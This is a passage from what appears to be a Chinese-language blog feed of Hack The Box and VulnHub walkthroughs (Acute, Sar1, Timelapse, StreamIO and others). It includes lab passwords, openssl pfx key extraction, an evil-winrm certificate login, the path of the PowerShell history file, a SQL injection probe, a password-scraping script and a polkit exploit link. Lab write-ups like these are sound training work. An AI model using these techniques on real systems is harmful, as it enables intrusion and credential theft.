&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEba21a112c62051f8191d46bcefd555faimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后是文件内容，英语挺重要：&lt;/p&gt;
&lt;p&gt;原始密码是：Password1!&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE93e40bc3cae9ca0fe0f345104db0c13fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后这里其实涉及了一个知识盲区，PSWA是什么东西：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7787611761e770eccc9a1a9242b89118image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEdfad486d271f9e44031a5f10ab92d612image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后上面说到的会议连接在这里：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4d920afa8c0b68c03132d544e4a4fb7aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;打开页面：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://atsserver.acute.local/Acute_Staff_Access&#34;&gt;https://atsserver.acute.local/Acute_Staff_Access&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE70c4428b1e1da9e3183cf2eb22a8ab8eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后这里Computer name应该是Acute-PC01，是word里面的作者，密码是Password1!，账户是网页上的，但是经过尝试，均为失败：&lt;/p&gt;
&lt;p&gt;然后问了一下GPT：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd5435cb71dc3ff2e46c3830c9455a079image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;也就是说可能是这种变形：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc12c78fb2716be13fa889352ed571759image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;账户名是：EDavies&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE21116ef509fd1d912543fb44a5a5de8eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;反弹shell:&lt;/p&gt;
&lt;p&gt;这里看是下载成功了，但是好像有杀软，被杀了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE711ea82608ebd740c11c84dc2ed4bf7bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后是我没想到的，我认为应该是进行免杀，但是作者是给了免杀目录的，我不太明白这是否具备普适性，所以我问了一下GPT：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa107fca6b135c6706f24712112b290bcimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;所以还是英语不太好，吃大亏了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbf62ff533327d3c3bdb581f11c9b0800image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用Get-ChildItem -Force可以查看隐藏文件&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE56fea9b0b68d0d25947440b0deff30f2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;权限提升&#34;&gt;权限提升&lt;/h1&gt;
&lt;p&gt;好吧，这里还是没办法，参考官方文档，只能使用msf了：&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x007 Sar1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x007-sar1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x007-sar1/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE299a1334c1a76c6a8fd9682d9553430e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h3 id=&#34;目录扫描&#34;&gt;目录扫描&lt;/h3&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0caa1a65f7306ce6c8cb8c29b80eafda%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现sar2HTML目录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4f066652fd2a691eda9de11d88847e6a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;web渗透&#34;&gt;web渗透&lt;/h1&gt;
&lt;p&gt;起初看到这个页面，分析了一会儿，可能是计划任务提权？文件上传？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEac25e59434fa6dfeb5c98da03c5c32ac%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后面就开始搜索这个应用的相关漏洞了，且版本合适：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb788867f85bb8c39eaf57052b0549a7a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd80468f5b0ca51403318b91b2cd6b0b6%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE65b77c4dcdf7de4698b608d043836a57%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看了一下脚本，大概这样构造就可以了&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE29be72ea5ed8e19610aeaa971556914f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;反弹shell:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE144974846cd3f5781fc2cc25adacb757%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6cc7c33a07d98693a32c5d8455a9cab4%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;user.txtls&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd2fcdafd45586c53d7d20d9f7472f320%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1ede32229f1c47b5e119120a9d84dfb4%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;当真计划任务？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9f6a56dabf082ca2d285ba81ad54eb2e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE46a4b6dda52d235164ec0b31b013438d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4108281c203ff341bb11ef15e3faac0e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9dafe7604ee5233815f73b239330ef84%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x008 Connect The Dots 1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x008-connect-the-dots-1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x008-connect-the-dots-1/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE74d11f3e5f68560e3557fa280859a177%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;目录扫描&#34;&gt;目录扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5aafe361346778506a374494f17024ac%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;web渗透&#34;&gt;WEB渗透&lt;/h1&gt;
&lt;p&gt;web渗透一段实践后无果，查看其他端口：&lt;/p&gt;
&lt;p&gt;nfs可挂载：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEaf4e31ab75baf2a39f3d550ac992d1fb%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;收集信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE30dacffaafc7e3ffebe689d4fb53732c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现密钥：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd441d3a42f03800fb56f1cf91b0676d6%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是无法连接：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1e8aa9370835721da8c0f6c19a2faae4%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h3 id=&#34;至此思路断了后面看wp说看mysite中的cs文件我最开始打眼一看以为是css就是没管没想到是cs随后又是一个jsfuck编码和解码&#34;&gt;至此思路断了，后面看WP，说看mysite中的cs文件，我最开始打眼一看，以为是css就是没管，没想到是CS，随后又是一个JSfuck编码和解码：&lt;/h3&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE506e7eb038b45845f782ff7524199b5e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6ded1483009027423da26ba1b396ba7d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;获得密码：TryToGuessThisNorris@2k19&lt;/p&gt;
&lt;p&gt;尝试登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1dfe8d3b5beafe60e4f12209d8c5cf20%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE237afc63eb80de6bbd426df2063a1703%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2dd90e1a2b42bacc7ae16f8529e138db%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;搜查了一圈没看到太多信息，盲猜可能需要提权到morris才能提到root&lt;/p&gt;
&lt;p&gt;在html目录下查到了一个swp文件&lt;/p&gt;
&lt;p&gt;想办法复原后出现密码：blehguessme090&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEccaf0ed13f6fa8d2cee83c93448cecaf%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;获得morris成功&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5544e450c2e97cebb7dcd465e645e1ea%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;polkit提权&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE192a194ad5350ecfce348ac0ff89d611%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;除了这个办法之外，看了一下评论区的&lt;a href=&#34;https://github.com/dzonerzy/poc-cve-2021-4034/releases/tag/v0.2&#34;&gt;https://github.com/dzonerzy/poc-cve-2021-4034/releases/tag/v0.2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1e0ca9547397d652778dc3ef1ffe9ae1%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X008 Timelapse</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x008-timelapse/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x008-timelapse/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE018e74c2d1d6b4774bee9e153f9fa396image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE971f10663a36b5709df0dd5fdc3b60c4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE275264544e3a192dbc7b35ebacad3c79image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;smb匿名访问：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7e4e95320e2efb7e81cb3556d4704ff7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;疑似重置后的密码？&lt;/p&gt;
&lt;p&gt;7c3XlgsE&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7987f78949a8217bb11355a4a8ca844eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3c4eeca319f202c25dab2bc1ec1e574dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;破解：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEacda20c829e62857094e69c518ee487aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是这东西怎么用呢，后面刚好培训遇到了，pfx是一种存储个人信息的文件，简单理解可以理解为ssh密钥文件，不过普遍都是加密状态，需要解密，破解使用john即可：&lt;/p&gt;
&lt;p&gt;thuglegacy&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4db93b4a2a32347beeac337f1e1ac932image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后需要将从pfx格式的文件，&lt;/p&gt;
&lt;p&gt;openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes&lt;/p&gt;
&lt;p&gt;openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4bf5687eb4cea770d74add9eb7c84c4fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3744727b51858143258abb2fdcf6a429image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;powershell历史文件位置：&lt;/p&gt;
&lt;p&gt;$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&lt;/p&gt;
&lt;p&gt;可以看到账号密码：&lt;/p&gt;
&lt;p&gt;$p = ConvertTo-SecureString &amp;lsquo;E3R$Q62^12p7PLlC%KWaxuaV&amp;rsquo; -AsPlainText -Force&lt;/p&gt;
&lt;p&gt;$c = New-Object System.Management.Automation.PSCredential (&amp;lsquo;svc_deploy&amp;rsquo;, $p)&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5315faf8cc6fcc4214a5969b8fa62464image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x009 Me and My Girlfriend 1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x009-me-and-my-girlfriend-1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x009-me-and-my-girlfriend-1/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEdfffdca74157c998c57878189cc37a67%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE936c2661ff43147fa789ee757caf2611%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;目录扫描&#34;&gt;目录扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd022d77849741000475cd353aa170648%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;web渗透&#34;&gt;WEB渗透&lt;/h1&gt;
&lt;p&gt;打开页面会提示只允许本地登录，通过插件添加x-forwarded-for字段即可：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6e4d266c1607287caa3b678a449cb67a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;注册账号登录，发现越权，获得账号密码，可能存在sql注入？后面跑了一下，看样子是没有：&lt;/p&gt;
&lt;p&gt;Eweuh Tandingan&lt;/p&gt;
&lt;p&gt;eweuhtandingan&lt;/p&gt;
&lt;p&gt;skuyatuh&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb070de05e0ed111d12d493530ad08e76%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用burp把所有的用户名提取出来：&lt;/p&gt;
&lt;p&gt;两个问题：1是kali自带的burp为社区版，不支持导出，2是脚本有点垃圾，需要手动删除一点儿垃圾&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import os

def extract_name(file_path):
    with open(file_path, &amp;#39;r&amp;#39;) as file:
        content = file.read()
        start_index = content.find(&amp;#39;id=&amp;#34;password&amp;#34; value=&amp;#34;&amp;#39;)
        if start_index != -1:
            start_index += len(&amp;#39;id=&amp;#34;password&amp;#34; value=&amp;#34;&amp;#39;)
            end_index = content.find(&amp;#39;&amp;#34;&amp;#39;, start_index)
            if end_index != -1:
                return content[start_index:end_index]
    return None

def process_files(folder_path):
    output_file = &amp;#39;password.txt&amp;#39;
    with open(output_file, &amp;#39;w&amp;#39;) as file:
        for root, dirs, files in os.walk(folder_path):
            for file_name in files:
                file_path = os.path.join(root, file_name)
                name = extract_name(file_path)
                if name is not None:
                    file.write(name + &amp;#39;\n&amp;#39;)

folder_path = &amp;#39;./&amp;#39;
process_files(folder_path)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功获得账户密码：&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X009 StreamIO</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x009-streamio/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x009-streamio/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3257329be177fe9aef7e4aaf52293d27image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd3c1b4b24bc3595c19b76fd9c7a427e1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbad7ae63e95fb7c7ab832c90dcb3c920image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;从端口开放情况来看，值得关注的端口有：80、389、443、445、3268、5985：&lt;/p&gt;
&lt;p&gt;先看445和389，3268等：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4a281f5b3be9d6918b712cc983ca01fdimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf3f130c2816498be203fa0fb14fd62aaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那么突破口应该就在80或者443了：&lt;/p&gt;
&lt;p&gt;简单看了一下首页，没有东西，目录扫描看看：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd0d40e50c454fdb84b6ec6ec134d9a84image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有注册和登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE17ea2ef4df506d9f2b6d590de8e8896fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;简单试了一下，好像没有万能密码，注册一个看看：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEdfe5603f94b28380e2893807f702875aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是不让登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbb1872229a80d5870f7a8b2c0ee61cadimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查看证书，发现域名好像不对：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE24fe63e5dd0fbbb8607cad6090bceda5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;访问这个网站：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf16ac18a8c8ec5e36e6e9823fed7ce1aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;好像也没有东西，再扫一下：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6e2747aa5f9e5ed0c57c279d3ecfb9ffimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现新内容：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE94b59761b65a13c2d34f8d708f1ce12dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;疑似sql注入：&lt;/p&gt;
&lt;p&gt;输入1‘&amp;ndash;+&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3f154c70c42d264e0354e08271598deeimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是好像有拦截：&lt;/p&gt;
&lt;p&gt;order by用不了，只能用select  挨个操作：&lt;/p&gt;
&lt;p&gt;测了半天，发现是个sqlserver:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd3526c4ab1b930e13333a6ba8fcc7230image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;当前数据库名称为&lt;/p&gt;
&lt;p&gt;STREAMIO&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8e2af23e6e1232cf3c8c74ca9c6d6549image.png&#34; alt=&#34;&#34;  /&gt;
